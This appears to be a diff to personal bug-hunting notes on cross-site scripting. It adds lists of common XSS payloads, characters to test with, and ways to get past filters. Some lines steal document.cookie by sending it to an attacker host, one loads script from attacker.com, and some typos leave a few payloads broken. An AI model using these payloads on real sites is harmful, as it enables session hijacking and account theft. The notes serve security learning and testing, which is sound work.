@@ -23,7 +23,7 @@
          * h<span>ttps://example.com?locale=<script>location='http://attacker_server_ip/?c=+document.cookie;</script>
   * **Self-XSS** - a social engineering attack that tricks users into executing a XSS intructed by the attacker.
 
-   ### Hunting for XSS
+### Hunting for XSS
    
   * The <script> tag are unlikely to work on their own, you must use different methods.
   * HTML attributes:
@@ -34,3 +34,36 @@
       * javascript: alert('Hello')
       * data: text/html; base64, PHNjcmlwd...+"
           * This scheme allows you to embed small files to the URL.
+          * The data at the end is encoded in base64 to bypass the XSS filters.
+  * Works on <img> tag.
+      * https://example.com/upload_profile_pic?url=IMAGE_URL
+      * IMAGE URL will be inserted in a <img> tag when the image is rendered.
+  * **Take note of which characters are being rendered directly and which ones are escaped.**
+###  Common payloads
+
+* <script> alert(1) </script>
+* <iframe src = javascript: alert(1) >
+* <body onload=alert(1)>
+* "><img src=x onerror=prompt(1);>
+* <script> alert(1)<!-
+    * <!- is an HTML comment, prevents syntax errors.
+* <a onmouseover" alert(1)"> test </a>
+* <script src=//attacker.com/test.js>
+
+### Other test methods
+
+* Test strings: >,',<,",//,:,=,;,!,--
+* Fuzzing
+
+### Bypassing filters
+
+* Mix different encodings and capitilizations to confuse filters.
+* HTML allows for syntax errors in capitilzations
+* If special characters are filtered, you cant write strings into a payload directly.
+    * Use JavaScript functions like fromCharCopde() that translates numeric codes to ASCII chars.
+    * <scrIPT> location=String.fromCharCode(104,116,...)+document.cookie;</srcIPT>
+    * Use http://js.do/
+* Sometimes applications remove tags once or a couple times.
+    * <scrip<script>t> ... </scrip</script>t>
+    * The inner script tags will be removed, but the outer ones will be brought together and execute.
+    
